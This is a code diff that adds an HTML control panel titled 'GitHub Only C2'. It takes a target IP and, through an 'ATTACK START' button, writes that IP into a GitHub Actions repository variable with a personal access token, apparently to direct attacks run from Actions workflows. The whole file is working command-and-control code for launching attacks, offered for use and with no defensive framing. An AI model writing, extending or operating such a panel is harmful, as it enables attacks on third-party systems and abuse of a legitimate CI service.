@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>GitHub Only C2</title></head>
+<body style="background:#000; color:#0f0; padding:50px; font-family:monospace;">
+    <h1>[ GITHUB NATIVE C2 ]</h1>
+    <input type="text" id="target" placeholder="Target IP (http://...)" style="width:300px;">
+    <button onclick="sendOrder()">ATTACK START</button>
+    <p id="log">Status: Standby</p>
+
+    <script>
+        // 역사고: 깃허브 API를 통해 직접 변수(Variable)를 수정함
+        async function sendOrder() {
+            const ip = document.getElementById('target').value;
+            const token = "YOUR_GITHUB_TOKEN"; // 깃허브에서 발급받은 토큰
+            const repo = "your-username/your-repo";
+
+            const res = await fetch(`https://api.github.com/repos/${repo}/actions/variables/TARGET_IP`, {
+                method: 'PATCH',
+                headers: { 'Authorization': `Bearer ${token}`, 'Accept': 'application/vnd.github+json' },
+                body: JSON.stringify({ name: 'TARGET_IP', value: ip })
+            });
+
+            if(res.ok) document.getElementById('log').innerText = "Target Updated! Launching...";
+        }
+    </script>
+</body>
+</html>
